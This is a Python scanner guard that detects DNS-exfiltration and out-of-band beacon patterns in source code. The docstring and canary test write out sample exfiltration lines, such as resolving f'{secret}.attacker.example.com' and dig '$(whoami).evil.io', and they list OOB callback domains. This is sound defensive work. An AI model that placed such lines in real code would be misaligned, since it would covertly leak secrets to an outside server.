"""Guard: no DNS-exfiltration / OOB-beacon pattern in source (checklist §8, new item).

Two independent exfiltration-channel signals, adapted from Datadog GuardDog's
`threat-network-dns-exfil` and the OOB-beacon half of `threat-npm-dependency-confusion`
source-code rules (GuardDog screens third-party packages; this guard applies the same
signatures to the target app's own source):

  **data label in front of a literal domain (HIGH):** `socket.getaddrinfo(...)` or
  `socket.gethostbyname(...)` whose hostname puts interpolated data (an f-string field,
  a `.format()` placeholder, or a concatenated value) as a LABEL directly in front of a
  literal public domain: `f"{secret}.attacker.example.com"`, `x + ".evil.com"`. This is
  the classic DNS-exfiltration covert channel: encode data into a subdomain label of a
  domain whose authoritative server the attacker runs, and resolve it, so the data
  leaves over DNS even through an egress firewall that only inspects HTTP. A lookup of
  a dynamic host on its own (`getaddrinfo(f"{host}", port)`, `dig -x "$ip"`,
  `dig A "$domain"`) is how all resolver code is written and never fires (PR #1048
  review measured two such HIGHs, one on the flagship), nor does a suffix under a
  private/special-use TLD (`.local`, `.internal`, ...), which never reaches an outside
  server. Also covers the shell-command form (`nslookup $VAR.attacker.example.com`,
  `dig "$(whoami).evil.io"`).

  **OOB-interaction-service beacon (HIGH):** `curl`/`wget` to a known out-of-band
  interaction domain (`burpcollaborator.net`/`.me`, `oastify.com`, `canarytokens.com`,
  `dnslog.cn`): domains that exist specifically to prove a blind callback fired and
  have essentially zero legitimate production use. (Deliberately excludes the broader,
  dual-use dev-tool domain list GuardDog's separate `threat-network-exfiltration` rule
  also carries (`ngrok.io`, `webhook.site`, `pastebin.com`), which are common,
  legitimate local-dev and testing tools and would be a real FP source here.)

Fires on Python source (dynamic-hostname rule, Python-specific per the original source
signatures) plus Python/JS/shell source and scripts (OOB-beacon rule, language-agnostic
since it is a literal-domain match). Suppress an audited case with a whole-file pragma
comment anywhere in the file:

    # security: allow-dns-exfiltration-pattern
"""
from __future__ import annotations

import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files,
    pragma_present,
    read,
    rel,
    strip_hash_comments,
    strip_js_comments,
    strip_python_strings,
)

_SHELL_SUFFIXES = (".sh", ".bash", ".zsh")
_JS_SUFFIXES = (".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs")
_PY_SUFFIXES = (".py", ".pyi")

# A literal domain suffix of at least two labels (`.attacker.example.com`, `.evil.io`) whose
# last label is not a private/special-use TLD: the suffix must end there (no further label), so
# backtracking cannot pick an inner label of `.svc.cluster.local` as the "TLD".
_PRIVATE_TLD = r"(?:local|localhost|internal|lan|home|corp|test|invalid|arpa|example)"
_LITERAL_DOMAIN = rf"\.(?:[A-Za-z0-9-]+\.)+(?!{_PRIVATE_TLD}(?![\w.-]))[A-Za-z]{{2,}}(?![\w.-])"
_PY_RESOLVE_CALL = r"socket\.(?:getaddrinfo|gethostbyname)\s*\(\s*"
_PY_DYNAMIC_LABEL_DNS = re.compile(
    _PY_RESOLVE_CALL + r"(?:"
    # f"{data}.attacker.example.com"
    rf"[rRbB]?[fF][rRbB]?(['\"])[^'\"\n]*\}}{_LITERAL_DOMAIN}"
    # "{}.attacker.example.com".format(data)
    rf"|(['\"])[^'\"\n]*\{{\w*\}}{_LITERAL_DOMAIN}[^'\"\n]*['\"]\s*\.format\s*\("
    # data + ".attacker.example.com"
    rf"|[^,()'\"\n]+\+\s*['\"]{_LITERAL_DOMAIN}['\"]"
    r")",
    re.IGNORECASE,
)
# `$VAR`, `${VAR}` or `$(cmd)` immediately followed by a literal domain, inside a dig/nslookup.
_SHELL_DNS_DYNAMIC = re.compile(
    rf"\b(?:nslookup|dig)\s+[^\n|&;]*?\$(?:\{{\w+\}}|\w+|\([^)\n]*\)){_LITERAL_DOMAIN}",
    re.IGNORECASE,
)

_OOB_DOMAIN = r"(?:burpcollaborator\.(?:net|me)|oastify\.com|canarytokens\.com|dnslog\.cn)"
_CURL_WGET_OOB = re.compile(
    rf"\b(?:curl|wget)\b[^\n]*{_OOB_DOMAIN}", re.IGNORECASE
)

_PRAGMA = re.compile(r"security:\s*allow-dns-exfiltration-pattern")
_STANDARDS = ["OWASP:A10", "CWE-201"]


class DnsExfiltrationPatternGuard(Guard):
    id = "dns-exfiltration-pattern"
    title = "No DNS-exfiltration / OOB-beacon pattern in source"
    area = "Code safety"

    # exfil.py: socket.getaddrinfo(f"{secret}.attacker.example.com", 80) -> fires
    # dns-exfiltration-pattern/dynamic-hostname-dns (HIGH).
    canary_plant = CanaryPlant(
        files={
            "exfil.py": (
                "import socket\n"
                "def leak(secret):\n"
                "    socket.getaddrinfo(f'{secret}.attacker.example.com', 80)\n"
            ),
        },
        expects=frozenset({"dns-exfiltration-pattern/dynamic-hostname-dns"}),
    )

    def applies(self, profile: StackProfile) -> bool:
        return bool({"python", "javascript", "typescript"} & profile.features)

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        seen: set[Path] = set()
        for f in iter_files(root, _PY_SUFFIXES + _JS_SUFFIXES + _SHELL_SUFFIXES):
            if f in seen:
                continue
            seen.add(f)
            if is_nonproduct_path(rel(root, f), profile.archive_segments):
                continue
            out.extend(self._scan(root, f))
        return out

    def _scan(self, root: Path, f: Path) -> list[Finding]:
        suffix = f.suffix.lower()
        text = read(f)
        if pragma_present(_PRAGMA, text, dialect=comment_dialect_for(f)):
            return []

        if suffix in _SHELL_SUFFIXES:
            code = strip_hash_comments(text)
        elif suffix in _PY_SUFFIXES:
            code = strip_python_strings(text, filename=f)
            code = "\n".join(
                ln if not ln.lstrip().startswith("#") else "" for ln in code.splitlines()
            )
        else:
            code = strip_js_comments(text, strip_strings=False)

        out: list[Finding] = []
        for i, line in enumerate(code.splitlines(), start=1):
            if suffix in _PY_SUFFIXES and _PY_DYNAMIC_LABEL_DNS.search(line):
                out.append(self._finding(
                    root, f, i, "dynamic-hostname-dns",
                    "A DNS resolution call puts interpolated data as a subdomain label in front "
                    "of a literal domain (an f-string field, .format() placeholder, or "
                    "concatenated value): the classic DNS-exfiltration shape, where resolving "
                    "the name delivers the data to that domain's authoritative server.",
                ))
            if suffix in _SHELL_SUFFIXES and _SHELL_DNS_DYNAMIC.search(line):
                out.append(self._finding(
                    root, f, i, "dynamic-hostname-dns",
                    "An `nslookup`/`dig` command puts a shell variable or command substitution "
                    "as a subdomain label in front of a literal domain: the same "
                    "DNS-exfiltration shape as the resolver-call form.",
                ))
            if _CURL_WGET_OOB.search(line):
                out.append(self._finding(
                    root, f, i, "oob-beacon",
                    "`curl`/`wget` targets a known out-of-band-interaction service domain "
                    "(e.g. burpcollaborator.net, canarytokens.com): these domains exist "
                    "specifically to prove a blind callback fired and have essentially no "
                    "legitimate production use.",
                ))
        return out

    def _finding(self, root: Path, f: Path, line: int, rule_suffix: str, message: str) -> Finding:
        return Finding(
            check_id=self.id,
            severity="high",
            title=self.title,
            location=f"{rel(root, f)}:{line}",
            message=message,
            remediation=(
                "Remove the exfiltration/beacon code. If this is genuinely a maintained "
                "security-testing tool, mark it with the inline suppress pragma."
            ),
            rule=f"dns-exfiltration-pattern/{rule_suffix}",
            standards=list(_STANDARDS),
        )
